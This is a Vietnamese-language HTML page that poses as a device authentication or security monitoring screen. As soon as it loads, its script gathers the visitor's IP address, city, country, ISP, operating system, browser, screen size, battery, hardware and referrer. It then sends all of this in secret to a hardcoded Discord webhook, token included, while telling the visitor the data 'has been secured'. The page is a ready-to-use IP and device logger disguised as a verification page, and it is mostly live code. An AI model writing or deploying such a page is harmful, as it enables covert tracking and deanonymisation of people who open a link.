<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hệ Thống Xác Thực Thiết Bị</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0d1117; color: #c9d1d9; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 600px; border: 1px solid #30363d; padding: 30px; background: #161b22; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.7); }
        .header { text-align: center; border-bottom: 2px solid #238636; padding-bottom: 15px; margin-bottom: 20px; }
        h2 { color: #ffffff; margin: 0; font-size: 1.5rem; letter-spacing: 1px; text-transform: uppercase; }
        
        .highlight { background: #0d1117; border-radius: 8px; padding: 20px; margin-bottom: 20px; border-left: 5px solid #39d353; border-right: 1px solid #30363d; border-top: 1px solid #30363d; border-bottom: 1px solid #30363d; }
        .label { color: #8b949e; font-size: 0.85rem; text-transform: uppercase; margin-bottom: 8px; font-weight: 600; }
        .value { color: #39d353; font-size: 1.4rem; font-weight: bold; font-family: 'Courier New', Courier, monospace; }

        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
        .card { background: #21262d; padding: 12px; border-radius: 8px; border: 1px solid #30363d; transition: 0.3s; }
        .card:hover { border-color: #58a6ff; }
        .card-label { color: #7d8590; font-size: 0.75rem; margin-bottom: 5px; }
        .card-value { color: #58a6ff; font-size: 1rem; font-weight: 600; }

        #status { text-align: center; margin-top: 25px; font-size: 0.9rem; color: #d29922; font-weight: bold; padding: 10px; border-radius: 5px; background: rgba(210, 153, 34, 0.1); }
        .time-box { color: #f0f6fc; font-size: 1.1rem; }
    </style>
</head>
<body>

<div class="container">
    <div class="header"><h2>Hệ Thống Giám Sát</h2></div>

    <div class="highlight">
        <div class="label">🌐 Địa chỉ IP xác thực:</div>
        <div id="ip" class="value">Đang quét...</div>
    </div>

    <div class="highlight">
        <div class="label">⏰ Thời gian hệ thống:</div>
        <div id="time" class="value time-box">--:--:--</div>
    </div>

    <div class="grid">
        <div class="card"><div class="card-label">📍 VỊ TRÍ</div><div id="city" class="card-value">Đang lấy...</div></div>
        <div class="card"><div class="card-label">💻 HỆ ĐIỀU HÀNH</div><div id="os" class="card-value">...</div></div>
        <div class="card"><div class="card-label">🧭 TRÌNH DUYỆT</div><div id="browser" class="card-value">...</div></div>
        <div class="card"><div class="card-label">🖥️ ĐỘ PHÂN GIẢI</div><div id="res" class="card-value">...</div></div>
        <div class="card"><div class="card-label">🔋 PIN</div><div id="battery" class="card-value">...</div></div>
        <div class="card"><div class="card-label">🧠 RAM / CPU</div><div id="hw" class="card-value">...</div></div>
    </div>

    <div id="status">Vui lòng đợi, đang đồng bộ dữ liệu bảo mật...</div>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1487644219945390160/FNtkSqJw4J-4md6mgXJpfwdCsX8pcWn72BEd6snufQKxCNzJzGL5HVzdgknp9L9-cCbM";

    async function startMonitoring() {
        // 1. Cập nhật thời gian & Thông số phần cứng (Lấy ngay lập tức)
        updateTime();
        const ua = navigator.userAgent;
        const os = ua.includes("Windows") ? "Windows 💻" : ua.includes("Android") ? "Android 📱" : ua.includes("iPhone") ? "iOS 🍎" : "Mac/Linux";
        const browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : "Safari";
        
        document.getElementById('os').innerText = os;
        document.getElementById('browser').innerText = browser;
        document.getElementById('res').innerText = `${screen.width}x${screen.height}`;
        document.getElementById('hw').innerText = `${navigator.deviceMemory || '?'}GB / ${navigator.hardwareConcurrency || '?'} nhân`;

        // 2. Lấy thông tin Pin
        let batTxt = "N/A";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batTxt = `${(b.level * 100).toFixed(0)}% ${b.charging ? '⚡' : '🔋'}`;
            document.getElementById('battery').innerText = batTxt;
        }

        // 3. Lấy IP & Vị trí (Phải đợi xong mới chạy tiếp)
        let net = {};
        try {
            document.getElementById('status').innerText = "📡 Đang truy vấn địa chỉ IP...";
            const response = await fetch('https://ipapi.co/json/');
            net = await response.json();
            
            // Hiển thị lên web
            document.getElementById('ip').innerText = net.ip || "N/A";
            document.getElementById('city').innerText = `${net.city || '?'}, ${net.country_name || '?'}`;
            
            // 4. Gửi sang Discord (Chắc chắn đã có IP)
            document.getElementById('status').innerText = "📤 Đang gửi dữ liệu về Discord...";
            await sendToDiscord(net, os, browser, batTxt);
            
            document.getElementById('status').innerText = "✅ HOÀN TẤT: Dữ liệu đã được bảo mật";
            document.getElementById('status').style.color = "#39d353";
            document.getElementById('status').style.background = "rgba(57, 211, 83, 0.1)";

        } catch (error) {
            document.getElementById('ip').innerText = "Lỗi kết nối";
            document.getElementById('status').innerText = "❌ Lỗi: Không thể lấy dữ liệu mạng";
            // Vẫn gửi những gì đã lấy được
            await sendToDiscord({}, os, browser, batTxt);
        }
    }

    async function sendToDiscord(net, os, br, bat) {
        const payload = {
            "username": "Hệ Thống Bảo Mật",
            "avatar_url": "https://i.imgur.com/4M34hi2.png",
            "content": "⚠️ **PHÁT HIỆN LƯỢT TRUY CẬP MỚI**",
            "embeds": [{
                "title": "CHI TIẾT THIẾT BỊ",
                "color": 15158332,
                "description": `
**🌐 Địa chỉ IP:** \`${net.ip || 'KHÔNG RÕ'}\`
**📍 Vị trí:** ${net.city || '?'}, ${net.country_name || '?'}
**🏢 Nhà mạng:** ${net.org || 'Không rõ'}

**💻 OS:** ${os}
**🧭 Browser:** ${br}
**🖥️ Resolution:** ${screen.width}x${screen.height}
**🔋 Pin:** ${bat}
**🧠 Cấu hình:** ${document.getElementById('hw').innerText}

**🍪 Cookie:** ${navigator.cookieEnabled ? 'Bật ✅' : 'Tắt ❌'}
**⏰ Thời gian:** ${document.getElementById('time').innerText}
**🔗 Nguồn:** ${document.referrer || 'Trực tiếp'}
                `,
                "footer": { "text": "Xác thực bởi AI Monitor" },
                "timestamp": new Date().toISOString()
            }]
        };

        return fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    function updateTime() {
        document.getElementById('time').innerText = new Date().toLocaleString('vi-VN');
    }

    // Chạy đồng hồ mỗi giây
    setInterval(updateTime, 1000);

    // Chạy chương trình chính
    startMonitoring();
</script>
</body>
</html>
